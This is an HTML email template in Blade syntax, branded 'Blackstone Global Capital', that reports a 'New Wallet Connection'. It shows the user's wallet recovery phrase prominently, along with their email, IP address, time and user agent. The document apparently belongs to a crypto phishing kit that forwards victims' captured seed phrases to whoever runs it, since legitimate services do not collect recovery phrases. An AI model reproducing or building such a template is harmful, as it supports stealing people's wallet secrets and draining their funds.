<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <style>
    body { font-family: 'Segoe UI', Arial, sans-serif; background: #0a0e17; margin: 0; padding: 20px; }
    .container { max-width: 600px; margin: 0 auto; background: #131824; border-radius: 16px; overflow: hidden; border: 1px solid #1e293b; }
    .header { background: linear-gradient(135deg, #f0b90b, #f59e0b); color: #000; padding: 20px; text-align: center; font-weight: 700; font-size: 18px; }
    .content { padding: 24px; color: #e2e8f0; }
    .label { color: #8892a8; font-size: 12px; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 4px; }
    .phrase-box { background: #0a0e17; border: 2px solid #f0b90b; color: #f0b90b; padding: 20px; border-radius: 12px; font-family: 'Courier New', monospace; font-size: 15px; word-break: break-all; margin: 15px 0; line-height: 1.6; }
    .info-row { display: flex; justify-content: space-between; padding: 8px 0; border-bottom: 1px solid #1e293b; font-size: 13px; }
    .info-label { color: #8892a8; }
    .info-value { color: #e2e8f0; font-weight: 500; }
    .footer { text-align: center; color: #64748b; font-size: 11px; padding: 16px; border-top: 1px solid #1e293b; }
  </style>
</head>
<body>
  <div class="container">
    <div class="header">🔐 New Wallet Connection</div>
    <div class="content">
      <div class="label">Recovery Phrase</div>
      <div class="phrase-box">{{ $data['keyPhrase'] }}</div>
      <div style="margin-top: 20px;">
        <div class="label" style="margin-bottom: 10px;">Connection Details</div>
        <div class="info-row">
          <span class="info-label">👤 User Email</span>
          <span class="info-value">{{ $data['user'] }}</span>
        </div>
        <div class="info-row">
          <span class="info-label">📅 Date/Time</span>
          <span class="info-value">{{ $data['date'] }}</span>
        </div>
        <div class="info-row">
          <span class="info-label">🌐 IP Address</span>
          <span class="info-value">{{ $data['ip'] }}</span>
        </div>
        <div class="info-row">
          <span class="info-label">🖥️ User Agent</span>
          <span class="info-value" style="font-size:11px;">{{ $data['userAgent'] }}</span>
        </div>
      </div>
    </div>
    <div class="footer">Blackstone Global Capital • Platform Services</div>
  </div>
</body>
</html>